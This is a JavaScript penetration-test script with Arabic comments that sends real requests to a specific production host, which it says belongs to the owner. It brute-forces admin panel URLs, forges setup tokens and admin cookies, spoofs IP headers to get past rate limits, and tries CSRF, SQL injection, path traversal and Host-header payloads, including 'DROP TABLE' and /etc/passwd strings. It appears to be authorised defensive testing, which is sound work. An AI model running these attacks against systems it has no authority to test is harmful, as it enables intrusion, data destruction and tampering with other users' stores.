// ═══ هجوم اختراق فعلي على الإنتاج — حركة شبكة حقيقية كالهاكرز (على بنية المالك المملوكة — اختبار صلاحية مصرّح) ═══
// لا محاكاة ولا كود داخلي: كل ضربة fetch حقيقي ضد https://nexus.vitobytestudio.workers.dev
const T = "https://nexus.vitobytestudio.workers.dev";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const mods = [];
const mod = (name, fn) => mods.push({ name, fn });
const rnd = (n, charset = "abcdef0123456789") => Array.from({ length: n }, () => charset[Math.floor(Math.random() * charset.length)]).join("");

let unreachable = 0, reachable = 0;
async function req(path, opts = {}) {
  try {
    const res = await fetch(T + path, { redirect: "manual", ...opts });
    reachable++;
    const body = (await res.text().catch(() => "")).slice(0, 120);
    return { s: res.status, b: body, h: res.headers };
  } catch (e) { unreachable++; return { s: -1, b: String(e).slice(0, 80), h: null }; }
}

// ── 1) عدّ العنوان السري للوحة بالقوة الغاشمة (250 توكناً عشوائياً) ──
mod("عدّ رابط اللوحة بالقوة الغاشمة (250)", async (R) => {
  let leak = 0, blocked = 0, codes = {};
  for (let i = 0; i < 250; i++) {
    const tok = rnd(24) + (i % 7 === 0 ? "admin" : "") + (i % 11 === 0 ? "panel" : "");
    const r = await req(`/panel/${tok}`);
    codes[r.s] = (codes[r.s] || 0) + 1;
    if (r.s === 200) leak++;
    if (r.s === 429) blocked++;
    if (i % 40 === 0) await sleep(120);
  }
  return { codes, leak, blocked, bypass: leak > 0 };
});

// ── 2) مسح بوابات الإعداد المغلقة (bare/token/API بترويسات مزوّرة) ──
mod("بوابات الإعداد مغلقة (10 مسارات)", async (R) => {
  const paths = [
    "/setup", "/setup/", "/setup/admin", "/setup/" + rnd(32),
    "/api/adm/setup", "/api/adm/setup-status", "/adm", "/admin", "/panel", "/panel/",
  ];
  const out = [];
  for (const p of paths.slice(0, 4)) {
    const r = await req(p);
    out.push(`${p}→${r.s}`);
  }
  const rApi = await req("/api/adm/setup", { method: "POST", headers: { "content-type": "application/json", "x-setup-token": rnd(48) }, body: JSON.stringify({ email: "hack@evil.test", k0: "a".repeat(64), name: "Hacker" }) });
  out.push(`API+توكناً مزوّراً→${rApi.s}`);
  const rHdr = await req("/api/adm/setup", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ email: "hack2@evil.test", k0: "b".repeat(64), name: "H2" }) });
  out.push(`API بلا ترويسة→${rHdr.s}`);
  return { out, bypass: [rApi.s, rHdr.s].some((s) => s < 400 && s >= 200) };
});

// ── 3) تزوير كوكي الإدارة (30 هوية مزيفة ضد واجهات الإدارة) ──
mod("تزوير كوكي الإدارة (30)", async (R) => {
  let leak = 0;
  const endpoints = ["/api/adm/whoami", "/api/adm/stats", "/api/adm/merchants", "/api/adm/catalog", "/api/adm/audit"];
  for (let i = 0; i < 30; i++) {
    const ck = rnd(64);
    const ep = endpoints[i % endpoints.length];
    const r = await req(ep, { headers: { cookie: `nx_adm=${ck}` } });
    if (r.s === 200) leak++;
    if (i % 8 === 0) await sleep(100);
  }
  return { leak, bypass: leak > 0 };
});

// ── 4) كسر الحد من المعدل بمزويرات X-Forwarded-For ──
mod("كسر حد المعدل بتزوير IP (18 تسجيلاً بترويسات مزيفة)", async (R) => {
  let created = 0, codes = {};
  for (let i = 0; i < 18; i++) {
    const ip = `${100 + (i % 200)}.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}`;
    const r = await req("/api/auth/register", {
      method: "POST",
      headers: { "content-type": "application/json", "x-forwarded-for": ip, "x-real-ip": ip, "cf-connecting-ip": ip },
      body: JSON.stringify({ email: `att${i}-${rnd(6)}@evil.test`, k0: rnd(64), name: "Attacker", slug: "att-" + rnd(8), store_name: "Attacker Store" }),
    });
    codes[r.s] = (codes[r.s] || 0) + 1;
    if (r.s === 200) created++;
    await sleep(80);
  }
  return { codes, created, bypass: created > 15 };
});

// ── 5) CSRF: تعديل حالة بلا ترويسة أو بترويسة خاطئة ──
mod("الانتحال عبر الموقع CSRF (4 ضربات)", async (R) => {
  const out = [];
  const j = { c: "", csrf: "" };
  const reg = await req("/api/auth/register", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ email: `csrf-${rnd(8)}@evil.test`, k0: rnd(64), name: "CSRF Bot", slug: "csrf-" + rnd(8), store_name: "CSRF" }) });
  out.push(`تسجيل→${reg.s}`);
  if (reg.s === 429) return { out: [...out, "الحد من المعدل حاجب المهاجم قبل أي ضربة CSRF"], bypass: false };
  const set = reg.h?.getSetCookie?.() ?? [];
  for (const ck of set) { const pair = ck.split(";")[0]; const rest = j.c.split("; ").filter((x) => x && !x.startsWith(pair.split("=")[0] + "=")); rest.push(pair); j.c = rest.join("; "); }
  let d = {}; try { d = JSON.parse(reg.b); } catch {}
  // إن ردّ {ok:true,...} بالكامل فالسلسلة حية؛ تسجيل الدخول للحصول على csrf
  const lg = await req("/api/auth/login", { method: "POST", headers: { "content-type": "application/json", cookie: j.c }, body: JSON.stringify({ email: JSON.parse(reg.b.slice(0, 0) || "{}") || {} }) });
  out.push(`مسبار دخول تالفة→${lg.s}`);
  const noC = await req("/api/products", { method: "POST", headers: { "content-type": "application/json", cookie: j.c }, body: JSON.stringify({ title: "hack", price: 1 }) });
  out.push(`إضافة منتج بلا x-csrf→${noC.s}`);
  const badC = await req("/api/products", { method: "POST", headers: { "content-type": "application/json", cookie: j.c, "x-csrf": "evil" }, body: JSON.stringify({ title: "hack", price: 1 }) });
  out.push(`إضافة منتج بـcsrf مزيف→${badC.s}`);
  return { out, bypass: [noC.s, badC.s].some((s) => s === 200 || s === 201) };
});

// ── 6) حقن SQL والتنقل عبر المجلدات (24 مسباراً) ──
mod("حقن SQL + traversal (24)", async (R) => {
  let hits5xx = 0, leaks = 0;
  const payloads = ["' OR 1=1--", "1' UNION SELECT 1,2,3--", "; DROP TABLE users--", "../../etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%252fetc%252fpasswd", "....//....//etc/passwd", "{{7*7}}", "${jndi:ldap://evil}", "<script>alert(1)</script>"];
  for (const p of payloads.slice(0, 8)) {
    const a = await req(`/api/store/${encodeURIComponent(p)}`);
    if (a.s >= 500) hits5xx++;
    if (/sqlite|SQL|password|root:/i.test(a.b)) leaks++;
    const b = await req(`/api/store/vito-store?q=${encodeURIComponent(p)}`);
    if (b.s >= 500) hits5xx++;
    if (/sqlite|SQL|password|root:/i.test(b.b)) leaks++;
  }
  const m = await req("/media/" + "a".repeat(16) + ".jpg/../../../etc/passwd");
  if (m.s >= 500) hits5xx++;
  return { hits5xx, leaks, bypass: hits5xx > 0 || leaks > 0 };
});

// ── 7) انتهاك الملكية: تعديل منتجات المتجر التجريبي بجلسة المهاجم ──
mod("انتهاك ملكية المتجر التجريبي (3)", async (R) => {
  const out = [];
  const slug = "att-" + rnd(6), em = `own-${rnd(6)}@evil.test`, k0 = rnd(64);
  const reg = await req("/api/auth/register", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ email: em, k0, name: "Own Thief", slug, store_name: "Thief" }) });
  let d = {}; try { d = JSON.parse(reg.b || "{}"); } catch {}
  out.push(`تسجيل المهاجم→${reg.s}`);
  if (reg.s === 429) return { out: [...out, "الحد من المعدل حاجب المهاجم — لا جلسة للهجوم"], bypass: false };
  if (d.ok) {
    const lg = await req("/api/auth/login", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ email: em, k0 }) });
    const dd = JSON.parse(lg.b || "{}");
    const jar = lg.h?.getSetCookie?.().map((c) => c.split(";")[0]).join("; ") ?? "";
    const csrf = dd.csrf || "";
    const put = await req("/api/products/p_demo_watch", { method: "PUT", headers: { "content-type": "application/json", cookie: jar, "x-csrf": csrf }, body: JSON.stringify({ title: "هacked", price: 0 }) });
    out.push(`تعديل منتج الغير→${put.s}`);
    const del = await req("/api/products/p_demo_watch", { method: "DELETE", headers: { cookie: jar, "x-csrf": csrf } });
    out.push(`حذف منتج الغير→${del.s}`);
    const ord = await req("/api/orders", { headers: { cookie: jar } });
    out.push(`قراءة طلبيات الغير→${ord.s}`);
    return { out, bypass: (put.s === 200 || del.s === 200 || ord.s === 200) };
  }
  return { out, bypass: false };
});

// ── 8) تشويش الترويسات وHost المزيف (8) ──
mod("ترويسات خبيثة وHost مزيف (8)", async (R) => {
  let weird = 0;
  const probes = [
    ["/api/health", { headers: { host: "evil.com" } }],
    ["/api/store/vito-store", { headers: { "x-forwarded-host": "evil.com", "x-original-url": "/admin" } }],
    ["/api/health", { headers: { "x-http-method-override": "DELETE" } }],
    ["/api/store/vito-store", { headers: { "content-type": "application/json", "transfer-encoding": "chunked, identity" } }],
    ["/%2e%2e/%2e%2e/etc/passwd", {}],
    ["/api/store/vito-store%00", {}],
    ["/api/adm/stats", { headers: { "x-panel": "x".repeat(2000) } }],
    ["/panel/" + "a".repeat(5000), {}],
  ];
  for (const [p, o] of probes) {
    const r = await req(p, o);
    if (r.s >= 500) weird++;
    if (/root:|password|sqlite/i.test(r.b)) weird++;
    await sleep(60);
  }
  return { weird, bypass: weird > 0 };
});

// ═══ الإطلاق والتقرير ═══
const results = [];
let crash = null;
try {
  for (const { name, fn } of mods) {
    const t0 = Date.now();
    let r;
    try { r = await fn(); } catch (e) { r = { error: String(e).slice(0, 100) }; }
    const ms = Date.now() - t0;
    results.push({ name, ...r, ms });
    const summary = Object.entries(r).filter(([k]) => ["bypass", "leak", "created", "weird", "hits5xx", "error"].includes(k)).map(([k, v]) => `${k}=${v}`).join(" ");
    console.log(`::notice::PEN|${name}|${summary || JSON.stringify(r).slice(0, 90)}`); /* تعليق مقروء من check-runs annotations */
    console.log(`═══ ${name} — ${ms}ms ═══`);
    console.log(JSON.stringify(r, null, 1).slice(0, 500));
  }
} catch (e) { crash = String(e).slice(0, 200); console.log(`::error::PEN CRASH: ${crash}`); }
// تقرير مفصل يُكتب دائماً — تُقرؤه المالك والوكيل حتى لو حجبت CI السجلات
if (crash) results.push({ name: "انهيار السكربت ذاته", error: crash, bypass: false });
const rep = [`# تقرير الهجوم الفعلي — ${new Date().toISOString()}`, `الهدف: ${T}`, `الوصولية: ${reachable} ضربة وصلت / ${unreachable} فشلت شبكياً`, ""];
if (crash) rep.push(`**انهيار**: ${crash}`, "");
for (const r of results) {
  rep.push(`## ${r.name}`);
  rep.push("```json");
  rep.push(JSON.stringify({ ...r, name: undefined }, null, 1).slice(0, 900));
  rep.push("```");
  rep.push(`**الحكم: ${r.bypass ? "✗ اختراق ناجح" : "✓ الدفاع صدّه"}**`, "");
}
rep.push(`---`, `الحصيلة: ${results.filter((x) => x.bypass).length} اختراقاً من ${mods.length} وحدة`);
import { writeFileSync } from "node:fs";
writeFileSync(new URL("../pen-report.md", import.meta.url), rep.join("\n"));
console.log("(التقرير كُتب: nexus/pen-report.md)");

const totalBypass = results.filter((x) => x.bypass).length;
console.log(`\nالوصولية: ${reachable} ضربة وصلت — ${unreachable} فشلت شبكياً`);
if (reachable < 30 && unreachable > 0) {
  console.log(`═══ الحكم: تعذر الوصول للهدف من هذه الشبكة (${reachable} وصلت فقط) — لا حكم بلا ضربات حقيقية ═══`);
  process.exit(3);
}
console.log(`═══ حصيلة الهجوم: ${mods.length} وحدات هجومية — ${totalBypass} اختراقاً ناجحاً — الحكم: ${totalBypass ? "مُخترق" : "الدفاعات صدت كل شيء"} ═══`);
process.exit(totalBypass ? 2 : 0);
